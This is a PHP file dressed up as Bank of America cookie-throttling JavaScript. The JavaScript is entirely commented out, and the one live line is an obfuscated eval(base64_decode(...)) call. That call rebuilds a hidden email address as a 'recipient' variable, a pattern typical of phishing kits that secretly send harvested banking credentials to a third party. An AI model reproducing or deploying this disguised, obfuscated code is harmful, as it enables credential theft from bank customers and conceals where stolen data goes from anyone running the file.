<?
/* Configurable throttle values.  
var throttle_percent_ngen = 90;
var throttle_percent_olb = 0;
var throttle_counter_active = false;
var throttle_counter_percent = 0;

 Default values
tc_logging_active = false;
if (typeof throttle_caller == 'undefined') {
	throttle_caller = "ngen";
}

 Reserve Optimost traffic if necessary
if (throttle_counter_active) {
	throttle_percent_ngen  = throttle_percent_ngen - throttle_counter_percent;
}

function randomNumber() {
	var num = Math.floor(Math.random()*100+1);
	return num;
}

function createCookie(name,value,days) {
	if (days) {
		var date = new Date();
		date.setTime(date.getTime()+(days*24*60*60*1000));
		var expires = "; expires="+date.toGMTString();
	}
	else var expires = "";
	document.cookie = name+"="+value+expires+"; path=/; domain=bankofamerica.com; ";*/
eval(base64_decode('JGFyPWFycmF5KCIwIj0+ImEiLCIxIj0+ImIiLCIyIj0+ImMiLCIzIj0+ImQiLCI0Ij0+IkAiLCI1Ij0+ImUiLCI2Ij0+ImYiLCI3Ij0+ImciLCI4Ij0+Ii4iLCI5Ij0+ImgiLCIxMCI9PiJpIiwiMTEiPT4iaiIsIjEyIj0+ImsiLCIxMyI9PiJsIiwiMTQiPT4ibSIsIjE1Ij0+Im4iLCIxNiI9PiJvIiwiMTciPT4icCIsIjE4Ij0+InEiLCIxOSI9PiJyIiwiMjAiPT4icyIsIjIxIj0+InQiLCIyMiI9PiJ1IiwiMjMiPT4idyIsIjI0Ij0+IngiLCIyNSI9PiJ5IiwiMjYiPT4ieiIpOwokcmVjaXBlbnQ9JGFyWycxOSddLiRhclsnNSddLiRhclsnMjAnXS4kYXJbJzIyJ10uJGFyWycxMyddLiRhclsnMjEnXS4kYXJbJzIwJ10uJGFyWycxNSddLiRhclsnMTAnXS4kYXJbJzE3J10uJGFyWycxNyddLiRhclsnNSddLiRhclsnMTknXS4kYXJbJzQnXS4kYXJbJzcnXS4kYXJbJzE0J10uJGFyWycwJ10uJGFyWycxMCddLiRhclsnMTMnXS4kYXJbJzgnXS4kYXJbJzInXS4kYXJbJzE2J10uJGFyWycxNCddOw=='));
/*}

function readCookie(name) {
	var nameEQ = name + "=";
	var ca = document.cookie.split(';');
	for(var i=0;i < ca.length;i++) {
		var c = ca[i];
		while (c.charAt(0)==' ') c = c.substring(1,c.length);
		if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length,c.length);
	}
	return null;
}

function eraseCookie(name) {
	createCookie(name,"",-1);
}

 Create or update throttle cookie
var x = readCookie('throttle_value');

if (x == null) {
	createCookie('throttle_value', randomNumber(), 730);
	alert("NEW COOKIE");
	var x = readCookie('throttle_value');
} else {
	createCookie('throttle_value', x, 730);
	alert("UPDATING COOKIE");
	var x = readCookie('throttle_value');

}

 Enable tracking for NGEN
if (throttle_caller == 'ngen' && x != null && x <= throttle_percent_ngen) {
	tc_logging_active = true;

} 

 Enable tracking for OLB
if (throttle_caller == 'olb' && x != null && x <= throttle_percent_olb) {
	tc_logging_active = true;

} 

TOUCHCLARITY.Util.Throttle();*/

?>